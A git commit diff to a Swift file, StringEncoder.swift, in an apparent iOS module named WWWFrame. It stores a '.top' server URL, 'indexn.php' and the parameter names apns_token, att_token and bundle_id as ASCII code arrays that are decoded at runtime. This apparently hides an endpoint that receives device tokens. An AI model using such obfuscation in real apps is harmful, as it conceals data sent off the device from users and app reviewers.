725636bb91e24fc7ddc8084c669b19540c23d466
Ваше имя <attentioninfo9@gmail.com>
2025-03-26 20:13:02 +0300

    secure2

--- Sources/WWWFrame/StringEncoder.swift
+++ Sources/WWWFrame/StringEncoder.swift
@@ -8,18 +8,18 @@ internal class StringEncoder {
     }
     
     // Закодированные константы
-    private static let k_domain_suffix = [46, 116, 111, 112] // ".top"
-    private static let k_protocol = [104, 116, 116, 112, 115, 58, 47, 47] // "https://"
-    private static let k_endpoint = [105, 110, 100, 101, 120, 110, 46, 112, 104, 112] // "indexn.php"
-    private static let k_param_data = [100, 97, 116, 97, 61] // "data="
-    private static let k_apns_token_param = [97, 112, 110, 115, 95, 116, 111, 107, 101, 110, 61] // "apns_token="
-    private static let k_att_token_param = [97, 116, 116, 95, 116, 111, 107, 101, 110, 61] // "att_token="
-    private static let k_bundle_id_param = [98, 117, 110, 100, 108, 101, 95, 105, 100, 61] // "bundle_id="
-    private static let k_stub_apns = [115, 116, 117, 98, 95, 97, 112, 110, 115] // "stub_apns"
-    private static let k_stub_att = [115, 116, 117, 98, 95, 97, 116, 116] // "stub_att"
-    private static let k_stub_bundle = [115, 116, 117, 98, 95, 98, 117, 110, 100, 108, 101] // "stub_bundle"
-    private static let k_cache_key = [87, 87, 87, 70, 114, 97, 109, 101, 95, 67, 97, 99, 104, 101, 100, 85, 82, 76] // "WWWFrame_CachedURL"
-    private static let k_keychain_key = [65, 80, 78, 83, 84, 111, 107, 101, 110, 75, 101, 121] // "APNSTokenKey"
+    private static let k_domain_suffix: [UInt8] = [46, 116, 111, 112] // ".top"
+    private static let k_protocol: [UInt8] = [104, 116, 116, 112, 115, 58, 47, 47] // "https://"
+    private static let k_endpoint: [UInt8] = [105, 110, 100, 101, 120, 110, 46, 112, 104, 112] // "indexn.php"
+    private static let k_param_data: [UInt8] = [100, 97, 116, 97, 61] // "data="
+    private static let k_apns_token_param: [UInt8] = [97, 112, 110, 115, 95, 116, 111, 107, 101, 110, 61] // "apns_token="
+    private static let k_att_token_param: [UInt8] = [97, 116, 116, 95, 116, 111, 107, 101, 110, 61] // "att_token="
+    private static let k_bundle_id_param: [UInt8] = [98, 117, 110, 100, 108, 101, 95, 105, 100, 61] // "bundle_id="
+    private static let k_stub_apns: [UInt8] = [115, 116, 117, 98, 95, 97, 112, 110, 115] // "stub_apns"
+    private static let k_stub_att: [UInt8] = [115, 116, 117, 98, 95, 97, 116, 116] // "stub_att"
+    private static let k_stub_bundle: [UInt8] = [115, 116, 117, 98, 95, 98, 117, 110, 100, 108, 101] // "stub_bundle"
+    private static let k_cache_key: [UInt8] = [87, 87, 87, 70, 114, 97, 109, 101, 95, 67, 97, 99, 104, 101, 100, 85, 82, 76] // "WWWFrame_CachedURL"
+    private static let k_keychain_key: [UInt8] = [65, 80, 78, 83, 84, 111, 107, 101, 110, 75, 101, 121] // "APNSTokenKey"
     
     // Геттеры для константных значений
     static var domainSuffix: String { return decode(asciiCodes: k_domain_suffix) }
